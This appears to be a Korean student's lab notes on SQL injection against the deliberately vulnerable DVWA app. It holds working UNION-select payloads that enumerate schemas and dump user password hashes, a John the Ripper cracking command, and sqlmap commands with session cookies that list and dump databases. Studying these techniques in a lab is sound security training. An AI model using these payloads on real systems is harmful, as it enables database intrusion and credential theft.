![[Pasted image 20241008103744.png]]
- (수동점검 , 자동점검) 두 방법이 있다.

## 수동 점검

![[Pasted image 20241008104030.png]]![[Pasted image 20241008104042.png]]
- 잘못된 구문을 입력하면 syntax 에러를 출력 > sql injection에 반응 하는 것을 확인
![[Pasted image 20241008104154.png]]
- 0 을 입력을 통해 해당되는 sql 조건 문을 확인
![[Pasted image 20241008104226.png]]
![[Pasted image 20241008104403.png]]
- 1~5까지 입력을 허용
![[Pasted image 20241008104443.png]]![[Pasted image 20241008104508.png]]
- 의도적으로 잘못된 구문 입력
![[Pasted image 20241008104523.png]]![[Pasted image 20241008104550.png]]
- 의도적으로 참이 되는 구문을 입력
![[Pasted image 20241008104614.png]]![[Pasted image 20241008104625.png]]
- 주석을 넣으니 다른 계정 정보도 확인할 수 있게된다.
- sql 문을 잘 설정하면 공격자가 원하는 정보를 얻을 수도 있을 것 같다.
![[Pasted image 20241008104846.png]]
- cookie 정보를 이용해 세션을 흉내
![[Pasted image 20241008105111.png]]
- 세션을 빌려 요청 웹 정보를 요청
  ![[Pasted image 20241008110430.png]]
- 수동 점검이 가능한 것으로 확인
- union select 구문을 활용하면 2개 이상의 sql 구문을 결합해서 사용할 수 있게 해준다.
  ![[Pasted image 20241008110603.png]]![[Pasted image 20241008110612.png]]
- 칼럼의 수는 1이 아닌 것을 알 수 있다.
- ![[Pasted image 20241008110733.png]]![[Pasted image 20241008110744.png]]1번 칼럼이 First name 2번째 칼럼이 Surname인 것을 알 수 있다.
- 1번 칼럼에 First name, 2번 칼럼에는 다른 데이터가 출력 되도록 구문을 작성할 수 있다.
- ![[Pasted image 20241008111046.png]]`5' union select 1,@@version#`![[Pasted image 20241008111131.png]]
- 버전을 검색해서 DB 정보를 획득할 수 있다.![[Pasted image 20241008111243.png]]
- DB 정보와 버전을 알면 취약점을 찾을 수 있다.![[Pasted image 20241008111340.png]]
- `5' union select table_schema,2 from information_schema.tables#` > 데이터 테이블 구조를 1번 칼럼에 출력하고 스키마의 테이블 수를 출력해라 는 명령어![[Pasted image 20241008112310.png]]
  (첫번째 출력은 5번째 사용자 이름을 출력하는 내용)
- `5' union select 1,table_name from information_schema.tables#` > 스키마에서 모든데이터 베이스의 테이블 이름들을 가져오는 sql 구문
	```
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: Bob  
	Surname: Smith
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: CHARACTER_SETS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: COLLATIONS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: COLLATION_CHARACTER_SET_APPLICABILITY
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: COLUMNS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: COLUMN_PRIVILEGES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: ENGINES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: EVENTS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: FILES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: GLOBAL_STATUS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: GLOBAL_VARIABLES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: KEY_COLUMN_USAGE
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: PARTITIONS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: PLUGINS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: PROCESSLIST
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: PROFILING
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: REFERENTIAL_CONSTRAINTS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: ROUTINES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: SCHEMATA
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: SCHEMA_PRIVILEGES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: SESSION_STATUS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: SESSION_VARIABLES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: STATISTICS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: TABLES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: TABLE_CONSTRAINTS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: TABLE_PRIVILEGES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: TRIGGERS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: USER_PRIVILEGES
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: VIEWS
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: guestbook
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: users
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: columns_priv
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: db
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: event
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: func
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: general_log
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: help_category
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: help_keyword
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: help_relation
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: help_topic
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: host
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: ndb_binlog_index
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: plugin
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: proc
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: procs_priv
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: servers
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: slow_log
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: tables_priv
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: time_zone
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: time_zone_leap_second
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: time_zone_name
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: time_zone_transition
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: time_zone_transition_type
	
	ID: 5' union select 1,table_name from information_schema.tables#  
	First name: 1  
	Surname: user
	```
	- table_name에는 DB에 사용되는 table들의 이름들이 모두 저장되도록 sql에서 기본 설정되어 있기 때문에 사용자가 임의의 작업을 하지 않았다면 테이블 이름들을 확인 할 수 있다.
- `5' union select 1,table_name from information_schema.tables where table_schema='dvwa'#` > dvwa DB의 테이블만 가져오는 구문![[Pasted image 20241008113053.png]]
- `5' union select 1, column_name from information_schema.columns where table_name='users'#`![[Pasted image 20241008113428.png]]
- user / password 칼럼의 정보를 열람하면 로그인 또한 가능할 것 같다.
- `5' union select user, password from dvwa.users#`![[Pasted image 20241008114000.png]]패스워드가 암호화 되어 있어 크랙 툴이 필요하다
- 일괄 hashing 코드 작성
![[Pasted image 20241008114438.png]]
- 암호화 정보 확인![[Pasted image 20241008114729.png]]![[Pasted image 20241008114842.png]]
- 일괄 암호화 크랙킹`john --format=Raw-MD5 users.txt`![[Pasted image 20241008115126.png]]
low
![[Pasted image 20241008120843.png]]
- 값을 받고 출력하는 기능만 있다.(보안 관련 코드가 없다.)

medium
![[Pasted image 20241008121104.png]]![[Pasted image 20241008121154.png]]
`id=1&Submit=Submit` 에 값을 변조하는 방법으로 sql injection을 테스트 할 수 있다.
- `id=1 or 1=1&Submit=Submit`![[Pasted image 20241008121318.png]]
- `id=1 or 1=1 union select user,password from dvwa.users&Submit=Submit`![[Pasted image 20241008121737.png]]
![[Pasted image 20241008121836.png]]
\
high
![[Pasted image 20241008121937.png]]
![[Pasted image 20241008121953.png]]
- 세션으로 검증하는 기능이 추가됨
![[Pasted image 20241008122147.png]]
- 하지만 주석에 대해서는 아직 취약하다
![[Pasted image 20241008122241.png]]
(주의) --(공백) : 주석

impossible
![[Pasted image 20241008122402.png]]
- ' 를 넣어도 아무 반응이 없다.
![[Pasted image 20241008122522.png]]
- 사용자 토큰이 있어서 URL를 바꿔서 넣어도 응답하지 않는다.
- sql injection 만으로는 공략이 어렵다.(다른 취약점과 함께 사용하면 공략할 수도 있다.)
## 자동 점검 툴
[[Zap]]
![[Pasted image 20241008123845.png]]
프록시 툴이지만 취약점 점검이 가능하다
공격방법과 취약점에대한 내용 등 상세한 정보를 확인할 수 있다.

[[sqlmap]]

![[Pasted image 20241008124445.png]]
- id 라는 파라미터가 취약하다는 것을 알고 있다.

![[Pasted image 20241008124727.png]]`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id`

![[Pasted image 20241008124954.png]]
- 총 4가지 sql injection에 대해서 id라는 파라미터가 갖는 취약점을 설명

`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id --dbs`
- --dbs: DB 목록 표시
![[Pasted image 20241008140330.png]]

`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa --tables`
- -D: Database 선택
- ![[Pasted image 20241008140457.png]]

`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa -T users --col`
- -T 테이블 선택
- --col 컬럼 전체 출력
![[Pasted image 20241008140610.png]]


`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa -T users --dump`
- --dump: 해시값 크래킹
![[Pasted image 20241008141044.png]]

![[Pasted image 20241008141111.png]]

![[Pasted image 20241008141157.png]]

`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D information_schema --tables`
![[Pasted image 20241008141855.png]]

`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D information_schema -T tables --col`
![[Pasted image 20241008142128.png]]

# Blind
![[Pasted image 20241008141423.png]]
![[Pasted image 20241008141445.png]]
- 문법에 대한 오류가 표시되지 않는다.
- 경우의 수를 전부 넣어 봐야 한다.


zap 에서 취약한 파라미터를 찾고 sqlmap을 활용해 sql injection (과제)
`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=low" -u "http://192.168.56.120/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -p id --dbs`
취약점 리스트
![[Pasted image 20241008144850.png]]

데이터베이스 리스트
![[Pasted image 20241008144906.png]]
